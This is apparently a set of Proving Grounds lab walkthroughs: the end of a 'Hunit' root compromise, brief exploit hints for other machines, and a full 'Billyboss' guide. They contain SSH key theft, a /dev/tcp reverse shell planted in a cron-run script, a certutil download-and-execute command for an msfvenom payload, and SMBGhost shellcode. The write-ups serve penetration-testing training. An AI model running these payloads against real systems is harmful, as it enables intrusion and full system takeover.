drwxr-xr-x 3 dademola dademola 4096 Nov 10 15:40 .
drwx------ 7 dademola dademola 4096 Nov 10 15:53 ..
drwxr-xr-x 8 dademola dademola 4096 Nov 10 15:54 .git
-rw-r--r-- 1 dademola dademola    0 Nov 10 15:40 NEW_CHANGE
-rw-r--r-- 1 dademola dademola   63 Nov 10 15:40 README
-rw-r--r-- 1 dademola dademola   60 Nov 10 15:52 backups.sh
```

Next, we'll attempt to grab the repository's log.

```
[dademola@hunit ~]$ cd git-server

[dademola@hunit git-server]$ git log
commit b50f4e5415cae0b650836b5466cc47c62faf7341 (HEAD -> master, origin/master, origin/HEAD)
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 21:05:58 2020 -0300

    testing

commit c71132590f969b535b315089f83f39e48d0021e2
Author: Dademola <dade@local.host>
Date:   Thu Nov 5 20:59:48 2020 -0300

    testing
...
```

There's not much here. Let's review the contents of the **backups.sh** script.

```
[dademola@hunit git-server]$ cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
```

This is simply a placeholder. Based on out knowledge of `git`, we can deduce that the **/root/pull.sh** script (which was referenced in the crontab backup file) pulls the changes done to the repository's `master` branch. To test this theory, we'll try to inject some code into the **backups.sh** script and then push the changes. First, we'll set up our Git identity.

```
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

Next, we'll inject a test instruction.

```
[dademola@hunit git-server]$ echo "touch /tmp/gitscript-test" >> backups.sh
```

Before adding and committing the updated script, we'll make it executable.

```
[dademola@hunit git-server]$ chmod +x backups.sh 
```

Finally, we'll add and commit our changes and attempt to push them to the `master` branch.

```
[dademola@hunit git-server]$ git add -A
[dademola@hunit git-server]$ git commit -m "pwn"
[master 159de6f] pwn
 1 file changed, 1 insertion(+)

[dademola@hunit git-server]$ git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 290 bytes | 290.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
error: remote unpack failed: unable to create temporary object directory
To file:///git-server/
 ! [remote rejected] master -> master (unpacker error)
error: failed to push some refs to 'file:///git-server/'
```

Unfortunately, we are not allowed to make changes to this repository. Further inspection reveals that the contents of the **/git-server** are owned by the `git` user.

```
dademola@hunit git-server]$ ls -la /git-server
total 40
drwxr-xr-x  7 git  git  4096 Nov  6 00:06 .
drwxr-xr-x 18 root root 4096 Nov 10 15:29 ..
-rw-r--r--  1 git  git    23 Nov  5 22:33 HEAD
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 branches
-rw-r--r--  1 git  git    66 Nov  5 22:33 config
-rw-r--r--  1 git  git    73 Nov  5 22:33 description
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 hooks
drwxr-xr-x  2 git  git  4096 Nov  5 22:33 info
drwxr-xr-x 16 git  git  4096 Nov  6 00:06 objects
drwxr-xr-x  4 git  git  4096 Nov  5 22:33 refs
```

### Git User SSH

According to **/etc/passwd**, the `git` user exists and uses **/usr/bin/git-shell** as the default shell.

```
[dademola@hunit git-server]$ grep git /etc/passwd      
git:x:1005:1005::/home/git:/usr/bin/git-shell
```

As referenced in the password file, **/home/git** exists.

```
[dademola@hunit git-server]$ ls -l /home 
total 8
drwx------ 7 dademola dademola 4096 Jan 14 18:28 dademola
drwxr-xr-x 4 git      git      4096 Nov  5 22:35 git
```

This folder contains a **.ssh** folder.

```
[dademola@hunit ~]$ ls -la /home/git
total 28
drwxr-xr-x 4 git  git  4096 Nov  5 22:35 .
drwxr-xr-x 4 root root 4096 Nov  5 22:28 ..
-rw------- 1 git  git     0 Nov  6 00:26 .bash_history
-rw-r--r-- 1 git  git    21 Aug  9 16:27 .bash_logout
-rw-r--r-- 1 git  git    57 Aug  9 16:27 .bash_profile
-rw-r--r-- 1 git  git   141 Aug  9 16:27 .bashrc
drwxr-xr-x 2 git  git  4096 Nov  5 22:31 .ssh
drwxr-xr-x 2 git  git  4096 Nov  5 22:35 git-shell-commands
```

Within this folder, we discover an **id_rsa** private key file.

```
[dademola@hunit git-server]$ ls -l /home/git/.ssh
total 12
-rwxr-xr-x 1 root root  564 Nov  5 22:31 authorized_keys
-rwxr-xr-x 1 root root 2590 Nov  5 22:31 id_rsa
-rwxr-xr-x 1 root root  564 Nov  5 22:31 id_rsa.pub
```

Interestingly, the **authorized_keys** and **id_rsa.pub** files are the same size, and the contents appear identical:

```
[dademola@hunit ~]$ cat /home/git/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
[dademola@hunit ~]$ 
[dademola@hunit ~]$ cat /home/git/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
[dademola@hunit ~]$
```

A `diff` reveals that the files are, in fact, identical.

```
[dademola@hunit ~]$ diff /home/git/.ssh/authorized_keys /home/git/.ssh/id_rsa.pub
[dademola@hunit ~]$
```

Since the **id_rsa.pub** public key is in the **authorized_keys** file, we should be able to use the private key to log in via SSH. Let's copy this private key to our attack machine and apply the proper permissions.

```
kali@kali:~$ scp -P 43022 dademola@192.168.120.204:/home/git/.ssh/id_rsa .
dademola@192.168.120.204's password: 
id_rsa   100% 2590    19.2KB/s   00:00    
kali@kali:~$
kali@kali:~$ chmod 0600 id_rsa 
```

Next, we'll attempt to use this private key to log in as the `git` user.

```
kali@kali:~$ ssh -p 43022 git@192.168.120.204 -i id_rsa
git> 
```

The key works, and our login attempt is successful!

### Reverse Shell

Since this is a **git-shell**, we should be able to interact with the repository. Let's clone this repo on our attack machine.

```
kali@kali:~$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

Now we can again attempt to push our changes to the `master` branch. As before, we'll first configure our Git identity.

```
kali@kali:~$ cd git-server
kali@kali:~/git-server$ git config --global user.name "kali"
kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
```

Next, we'll inject a reverse shell payload into the **backups.sh** script and make it executable.

```
kali@kali:~/git-server$ echo "sh -i >& /dev/tcp/192.168.118.8/8080 0>&1" >> backups.sh 
kali@kali:~/git-server$ chmod +x backups.sh
```

Let's add and commit our changes.

```
kali@kali:~/git-server$ git add -A
kali@kali:~/git-server$ git commit -m "pwn"
[master cb7104c] pwn
 1 file changed, 1 insertion(+)
 mode change 100644 => 100755 backups.sh
```

Before pushing our payload, we'll set up a Netcat listener on port 8080.

```
kali@kali:~$ nc -lvnp 8080 
listening on [any] 8080 ...
```

Once our listener is ready, we'll attempt to push to the `master` branch.

```
kali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.120.204:/git-server
   b50f4e5..0212790  master -> master
kali@kali:~/git-server$ 
```

The crontab backup file indicates that the **pull.sh** script runs every two minutes, and the **backups.sh** script runs every three minutes. Because of this, it may take up to five minutes to determine if our attack was successful.

Once our changes are synchronized, and our payload is executed inside the **backups.sh** script, we should receive our `root` user shell.

```
kali@kali:~$ nc -lvnp 8080 
listening on [any] 8080 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.204] 51816
...
sh-5.0# whoami
root
```

# Hetemit 
# Sybaris - Default FTP home /var/lib/ftp
# Malbec
# Authby - Windows server 2008 use CVE-2018-8120
# Jacko - Exploit h2 database, use certutil to write shell without escaping things, privesc with softwared installed
# UT-99 - exploit IRC through hexchat
# Medjed - very hard SQL Injection https://pentesting.zeyu2001.com/proving-grounds/get-to-work/medjed
# Butch - super super hard SQL Injection https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html
# Hutch - Exploit upload ASPX shell with curl, LAPS read https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/windows/hutch
# Billyboss - SMBGhost
# Exploitation Guide for Billyboss

## Summary

We'll gain a foothold on this machine with some basic password guessing. We'll then exploit a remote code execution vulnerability in the Sonatype Nexus application installed on this machine. Finally, we'll exploit the SMBGhost vulnerability to escalate our privileges.

## Enumeration

### Nmap

We'll start off with a simple Nmap scan.

```
kali@kali:~$ sudo nmap 192.168.140.61
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 01:33 EST
Nmap scan report for 192.168.140.61
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```

### Sonatype Nexus

Browsing to the website on port 8081, we find an installation of Sonatype Nexus. A quick online search reveals that there are no default credentials we can exploit. However, after a few educated guesses, we log in as `nexus:nexus`.

According to the information in the top-left corner, the target is running Sonatype Nexus version 3.21.0-05.

## Exploitation

### Sonatype Nexus Authenticated Code Execution

An EDB search reveals that version 3.21.0-05 of Sonatype Nexus is vulnerable to a [remote code execution exploit](https://www.exploit-db.com/exploits/49385). To run the exploit, we'll first generate an MSFVenom reverse shell payload.

```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8081
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

We'll host our payload over HTTP.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's start a Netcat handler on port 8081 to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We'll modify the exploit as follows:

```
URL='http://192.168.140.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe'
USERNAME='nexus'
PASSWORD='nexus'
```

Next, we'll run the exploit to download our payload.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

We'll make a few more modifications, this time executing our payload.

```
CMD='cmd.exe /c shell.exe'
```

Let's run the exploit again.

```
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
Command executed
```

Finally, we catch our reverse shell as `nathan`.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.140.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.140.61] 49883
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan
```

## Escalation

### Installed Patches Enumeration

Listing the installed KBs, we learn that the most recently installed patch is `KB4540673`. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list
wmic qfe list
Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=4552931  BILLYBOSS  Update                        KB4552931               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497165  BILLYBOSS  Update                        KB4497165               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4497727  BILLYBOSS  Security Update               KB4497727                                    4/1/2019 
http://support.microsoft.com/?kbid=4537759  BILLYBOSS  Security Update               KB4537759               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4552152  BILLYBOSS  Security Update               KB4552152               NT AUTHORITY\SYSTEM  5/26/2020
http://support.microsoft.com/?kbid=4540673  BILLYBOSS  Update                        KB4540673               BILLYBOSS\nathan     5/27/2020
```

### SMB Settings Enumeration

To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.

```

C:\Users\nathan\Nexus\nexus-3.21.0-05>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1788
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       808
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:8081           0.0.0.0:0              LISTENING       2076
...
```

### SMBGhost Exploitation

We'll use [this exploit](https://github.com/danigargu/CVE-2020-0796) against the SMB service. Starting with line 204 in **exploit.cpp**, we'll replace the shellcode with a reverse shell.

```
// Generated with msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
uint8_t shellcode[] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
    0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
    0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x91,0xc0,0xa8,0x31,0xb1,0x41,0x54,
    0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
    0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
    0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
    0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
    0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
    0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
    0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
    0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
    0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
    0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
    0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
    0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
    0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
    0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
    0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
};
```

Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to `x64` and `Release` and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe
certutil -urlcache -split -f http://KALI/cve-2020-0796-local.exe cve-2020-0796-local.exe
****  Online  ****
  000000  ...
  01e600
CertUtil: -URLCache command completed successfully.
```

Let's start a Netcat handler to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```

We can now trigger the exploit.

```
C:\Users\nathan\Nexus\nexus-3.21.0-05>cve-2020-0796-local.exe
cve-2020-0796-local.exe
-= CVE-2020-0796 LPE =-
by @danigargu and @dialluvioso_

Successfully connected socket descriptor: 216
Sending SMB negotiation request...
Finished SMB negotiation
Found kernel token at 0xffffab002ca2c060
Sending compressed buffer...
SEP_TOKEN_PRIVILEGES changed
Injecting shellcode in winlogon...
Success! ;)
```

Our listener indicates we have obtained a SYSTEM shell.

```
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
192.168.177.61: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.177.61] 49687
Microsoft Windows [Version 10.0.18362.719]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

